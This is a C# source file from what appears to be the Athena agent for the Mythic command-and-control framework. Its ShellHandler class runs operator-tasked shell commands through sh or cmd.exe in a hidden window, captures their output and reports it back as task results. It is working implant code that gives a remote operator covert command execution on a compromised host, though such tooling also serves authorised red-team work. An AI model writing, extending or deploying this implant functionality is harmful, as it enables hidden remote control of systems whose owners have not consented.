using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Tasks;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PluginBase;

namespace Athena.Commands
{
    public class ShellHandler
    {
        ConcurrentDictionary<string, ShellJob> commandTracking = new ConcurrentDictionary<string, ShellJob>();
        public ShellHandler()
        {

        }
        /// <summary>
        /// Check if any shell commands are running
        /// </summary>
        public async Task<bool> HasRunningJobs()
        {
            if(commandTracking.Count > 0)
            {
                return true;
            }
            return false;
        }
        /// <summary>
        /// Execute a shell command
        /// </summary>
        /// <param name="job">The MythicJob containing the execution parameters</param>
        public async Task<ResponseResult> ShellExec(MythicJob job)
        {
            string shell;
            if (OperatingSystem.IsMacOS() || OperatingSystem.IsLinux())
            {
                shell = Environment.GetEnvironmentVariable("SHELL");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "/bin/sh";
                }
                job.task.parameters = "-c " + job.task.parameters;
            }
            else if (OperatingSystem.IsWindows())
            {
                shell = Environment.GetEnvironmentVariable("ComSpec");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "cmd.exe";
                }
                job.task.parameters = "/C " + job.task.parameters;
            }
            else
            {
                return new ResponseResult()
                {
                    user_output = "Could not determine shell!",
                    task_id = job.task.id,
                    completed = "true",
                };
            }


            ShellJob sj = new ShellJob(job)
            {
                sb = new StringBuilder(),
                isRunning = true,
                process = new Process
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = shell,
                        Arguments = job.task.parameters,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true
                    }
                }
            };
            try
            {
                sj.process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) sj.sb.AppendLine(errorLine.Data); };
                sj.process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) sj.sb.AppendLine(outputLine.Data); };


                sj.process.Start();
                sj.process.BeginErrorReadLine();
                sj.process.BeginOutputReadLine();
                
                //Add to Tracking
                this.commandTracking.GetOrAdd(sj.task.id, sj);

                sj.process.WaitForExit();

                //Remove from tracking
                this.commandTracking.Remove(sj.task.id, out _);

                sj.isRunning = false;

                ResponseResult result = new ResponseResult()
                {
                    user_output = sj.sb.ToString(),
                    task_id = job.task.id,
                    completed = "true",
                };

                sj.sb.Clear();

                if (sj.process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + sj.process.ExitCode;
                }

                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                    user_output = sj.sb.ToString() + Environment.NewLine + e.Message,
                    task_id = job.task.id,
                    completed = "true",
                    status = "error"
                };
            }
        }
        /// <summary>
        /// Get current output from executing commands
        /// </summary>
        public async Task<List<ResponseResult>> GetOutput()
        {
            ConcurrentBag<ResponseResult> results = new ConcurrentBag<ResponseResult>();

            await Parallel.ForEachAsync(commandTracking, async (job, cancellationToken) =>
            {
                if (job.Value.sb.Length > 0)
                {
                    results.Add(new ResponseResult() {
                        user_output = job.Value.sb.ToString(),
                        task_id = job.Value.task.id,
                    });

                    job.Value.sb.Clear();
                }
            });

            return results.ToList();
        }
    }
}
